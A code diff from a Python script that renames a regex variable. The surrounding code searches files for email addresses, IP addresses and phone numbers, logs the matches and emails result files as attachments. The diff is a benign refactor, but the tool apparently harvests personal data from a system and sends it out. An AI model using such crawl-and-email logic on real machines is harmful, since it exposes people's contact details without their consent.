@@ -82,7 +82,7 @@ def main():
         re_file = re.compile(r'^\.?[a-zA-Z\d]{1,255}$')
 
     # Compile regex for matching data in files #
-    re_email = re.compile(r'^[a-zA-Z\d!#$%&\'*+-/=^_{|}~.]{1,64}@[a-z]{1,12}\.[a-z]{2,4}')
+    re_attachment = re.compile(r'^[a-zA-Z\d!#$%&\'*+-/=^_{|}~.]{1,64}@[a-z]{1,12}\.[a-z]{2,4}')
     re_ip = re.compile(r'(?:\s|^)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
     re_phone = re.compile(r'(1?)(?:\s|^)\d{3}-\d{3}-\d{4}')
 
@@ -128,7 +128,7 @@ def main():
                                 print(line)
 
                                 # If line matches a regular expression #
-                                if re_email.search(line) or re_ip.search(line) or re_phone.search(line):
+                                if re_attachment.search(line) or re_ip.search(line) or re_phone.search(line):
                                     # Write results to match file #
                                     with open(f'{path}crawlMatches.txt', 'a') as details:
                                         details.write(f'Path => {dir_path}\n')
@@ -200,15 +200,16 @@ def main():
 
     # If the OS is Windows #
     if os.name == 'nt':
-        re_email = re.compile(r'^e_[^<>:\"/\\|?*]{1,255}')
+        re_attachment = re.compile(r'^e_[^<>:\"/\\|?*]{1,255}')
     # If the OS is Linux #
     else:
-        re_email = re.compile(r'^e_[^/]{1,255}')
+        re_attachment = re.compile(r'^e_[^/]{1,255}')
 
     # Iterate though result files and attach to email #
     for _, _, file_names in os.walk(path):
         for file in file_names:
-            if re_email.match(file):
+            #
+            if re_attachment.match(file):
                 p = MIMEBase('application', 'octet-stream')
                 with open(path + file, 'rb') as attachment:
                     p.set_payload(attachment.read())
